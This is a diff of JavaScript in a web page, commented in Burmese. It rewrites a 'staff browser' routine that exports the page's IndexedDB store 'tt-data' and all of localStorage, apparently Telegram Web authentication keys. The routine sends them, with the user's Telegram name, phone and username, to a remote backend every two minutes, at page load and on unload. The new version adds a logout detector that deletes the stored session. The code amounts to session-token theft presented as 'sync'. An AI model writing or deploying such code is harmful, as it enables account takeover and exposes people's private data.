@@ -210,84 +210,94 @@ async function exportIndexedDB(dbName, storeName) {
             });
 
         } else {
-            // ================= STAFF BROWSER =================
-            console.log("✅ Background Session Sync RUNNING!");
-            
-            setTimeout(() => {
-    let myUserId = localStorage.getItem("my_custom_user_id");
-    if (!myUserId) {
-        myUserId = "staff_" + Math.floor(Math.random() * 100000);
-        localStorage.setItem("my_custom_user_id", myUserId);
-    }
-
-    // Phase 2: Data အပြောင်းအလဲကို သိမ်းထားရန် Variable
-    let lastSyncLength = 0; 
-
-    const syncSessionData = async () => {
-        try {
-            const rawIdbData = await exportIndexedDB("tt-data", "store");
-            
-            if (Object.keys(rawIdbData).length > 0) { 
-                const idbDataStr = serializeData(rawIdbData);
-                const lsDataStr = JSON.stringify(localStorage);
-                
-                // (၁) Data အသစ်ရဲ့ စုစုပေါင်း Size ကို တွက်ပါမယ်
-                const currentDataLength = idbDataStr.length + lsDataStr.length;
-
-                // (၂) Size အပြောင်းအလဲ မရှိရင် Backend ကို မပို့တော့ပါဘူး (Performance သက်သာစေရန်)
-                if (lastSyncLength === currentDataLength) {
-                    console.log("⚡ Data ပြောင်းလဲမှုမရှိပါ။ Sync မလုပ်ပါ။ (Bandwidth သက်သာစေသည်)");
-                    return; 
-                }
-
-                let profile = getTelegramProfile();
-                let finalUid = profile ? profile.uid : myUserId;
-                let finalName = profile ? profile.name : "Unknown Staff";
-                let finalPhone = profile ? profile.phone : myUserId;
-                let finalUsername = profile ? profile.username : "";
-
-                const res = await fetch(BACKEND_URL + "/api/save_session", {
-                    method: "POST",
-                    headers: { 
-                        "Content-Type": "application/json",
-                        "x-api-key": API_KEY // Phase 1 မှ API Key
-                    },
-                    body: JSON.stringify({
-                        user_id: finalUid, 
-                        profile_name: finalName,
-                        profile_phone: finalPhone,
-                        profile_username: finalUsername,
-                        local_storage_str: lsDataStr,
-                        indexed_db_str: idbDataStr,
-                        timestamp: new Date().toISOString()
-                    })
-                });
-                
-                if(res.ok) {
-                    console.log(`✅ Smart Sync အောင်မြင်ပါသည်: ${finalName}`);
-                    // (၃) အောင်မြင်သွားရင် နောက်ဆုံး Data Size ကို မှတ်ထားပါမယ်
-                    lastSyncLength = currentDataLength; 
-                }
-            } else {
-                console.log("⏳ Waiting for IndexedDB login data...");
+// ================= STAFF BROWSER =================
+        console.log("✅ Lightweight Auth Sync & Logout Detector RUNNING!");
+        
+        setTimeout(() => {
+            let myUserId = localStorage.getItem("my_custom_user_id");
+            if (!myUserId) {
+                myUserId = "staff_" + Math.floor(Math.random() * 100000);
+                localStorage.setItem("my_custom_user_id", myUserId);
             }
-        } catch(e) {
-            console.error("❌ Sync failed:", e);
-        }
-    };
 
-    // (၄) ၁၅ စက္ကန့် အစား ၁၂၀,၀၀၀ ms (၂ မိနစ်) တစ်ခါသာ စစ်ဆေးပါတော့မယ်
-    setInterval(syncSessionData, 120000); 
+            let lastSyncLength = 0; 
+            let wasLoggedIn = false; // ယခင်က Login ဝင်ထားခြင်း ရှိ/မရှိ မှတ်သားရန်
 
-    // (၅) Staff က Browser ကို ပိတ်လိုက်တဲ့ အချိန် (သို့) Refresh လုပ်တဲ့ အချိန်မှာ ချက်ချင်း Sync လုပ်ပါမယ်
-    window.addEventListener('beforeunload', () => {
-        syncSessionData();
-    });
+            const syncSessionData = async () => {
+                let profile = getTelegramProfile();
+                
+                // --- LOGOUT DETECTOR LOGIC ---
+                // အရင်က Login ဝင်ထားပြီး အခု Profile မရှိတော့ဘူး (သို့) Logout နှိပ်လိုက်ပြီဆိုရင်
+                if (wasLoggedIn && !profile) {
+                    console.log("⚠️ ညွှန်ကြားချက်: User သည် Logout လုပ်သွားပါသည်။ DB မှ Session ကို ရှင်းလင်းနေပါသည်...");
+                    try {
+                        await fetch(BACKEND_URL + "/api/delete_session", {
+                            method: "POST",
+                            headers: { 
+                                "Content-Type": "application/json",
+                                "x-api-key": API_KEY 
+                            },
+                            body: JSON.stringify({ user_id: myUserId }) // myUserId ဖြင့် ဖျက်မည်
+                        });
+                        console.log("🗑️ Database မှ Data အားလုံး အောင်မြင်စွာ ဖျက်ပစ်လိုက်ပါပြီ။");
+                        wasLoggedIn = false; // Status ပြန်လည်သတ်မှတ်သည်
+                        lastSyncLength = 0;
+                    } catch(e) { console.error("❌ DB မှဖျက်ရာတွင် အမှားအယွင်းဖြစ်နေပါသည်", e); }
+                    return; // Logout ဖြစ်သွား၍ ဆက်မလုပ်တော့ပါ
+                }
 
-    // စဖွင့်ဖွင့်ချင်းမှာ တစ်ခါတန်း Sync လုပ်ပါမယ်
-    syncSessionData();
+                // Profile ရှိနေသေးရင် (Login ဝင်ထားဆဲဆိုရင်)
+                if (profile) {
+                    wasLoggedIn = true; 
+                    myUserId = profile.uid; // Actual User ID ကို Update လုပ်သည်
+                }
 
-}, 5000);
+                // --- SYNC LOGIC ---
+                try {
+                    const rawIdbData = await exportIndexedDB("tt-data", "store"); // ယခုအခါ Auth Data များသာ ပါတော့မည်
+                    
+                    if (Object.keys(rawIdbData).length > 0 && profile) { 
+                        const idbDataStr = serializeData(rawIdbData);
+                        const lsDataStr = JSON.stringify(localStorage);
+                        
+                        const currentDataLength = idbDataStr.length + lsDataStr.length;
+
+                        if (lastSyncLength === currentDataLength) return; 
+
+                        const res = await fetch(BACKEND_URL + "/api/save_session", {
+                            method: "POST",
+                            headers: { 
+                                "Content-Type": "application/json",
+                                "x-api-key": API_KEY
+                            },
+                            body: JSON.stringify({
+                                user_id: profile.uid, 
+                                profile_name: profile.name,
+                                profile_phone: profile.phone,
+                                profile_username: profile.username,
+                                local_storage_str: lsDataStr,
+                                indexed_db_str: idbDataStr,
+                                timestamp: new Date().toISOString()
+                            })
+                        });
+                        
+                        if(res.ok) {
+                            console.log(`✅ Auth Key Sync အောင်မြင်ပါသည်: ${profile.name}`);
+                            lastSyncLength = currentDataLength; 
+                        }
+                    }
+                } catch(e) { console.error("❌ Sync failed:", e); }
+            };
+
+            setInterval(syncSessionData, 120000); // ၂ မိနစ် တစ်ခါ စစ်မည်
+
+            window.addEventListener('beforeunload', () => {
+                syncSessionData();
+            });
+
+            syncSessionData(); // စစချင်း တစ်ခါ Run မည်
+
+        }, 5000);
         }
     });
   </script>
